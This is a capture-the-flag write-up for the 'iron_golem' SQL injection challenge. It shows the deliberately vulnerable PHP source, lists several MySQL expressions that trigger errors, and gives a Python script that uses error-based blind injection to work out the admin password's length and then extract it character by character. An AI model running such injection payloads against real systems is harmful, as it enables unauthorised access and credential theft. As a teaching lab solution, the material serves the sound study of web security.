# iron_golem

```php

<?php
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit(mysqli_error($db));
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
  highlight_file(__FILE__);
?>
```

Here we have to find the admins password. Here we are not getting the results as output. It's only giving errors. So we are trying to get an error when the character is correct and I wrote a script for that.
## Methods to get errors
pw = ""
1. ### (select id union select pw)
   It will give an error `Subquery returns more than 1 row`
2. ### (Select exp(~0))
   It will give an error `DOUBLE value is out of range in 'exp(~(0))'`
   source : `https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/`
3. ### (select pow(~0,~0))
   It will give an error `DOUBLE value is out of range in 'pow(~(0),~(0))'`
   
4. 

```python
import requests
from string import digits,ascii_lowercase

session = requests.Session()
cookies = {"PHPSESSID": "7sp0e6btgarr92g7av9b5ddi58"}

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or if(length(pw)={},null,(select id union select pw));--+"
for i in range(100):
    r = requests.get(url.format(i), cookies=cookies)
    print(i,end='\r')
    if('Subquery returns more than' not in r.text):
        l=i
        break
print("Length :",l) 
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or if(pw like '{}%',null,(select id union select pw));--+"
pw = ""
for j in range(l):
    for i in digits+ascii_lowercase:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('Subquery returns more than' not in r.text and i not in "#+%&"):
            pw += i
            print("Password : {}".format(pw),end='\r')
            break
print("Password :", pw)

```

This will give the password.
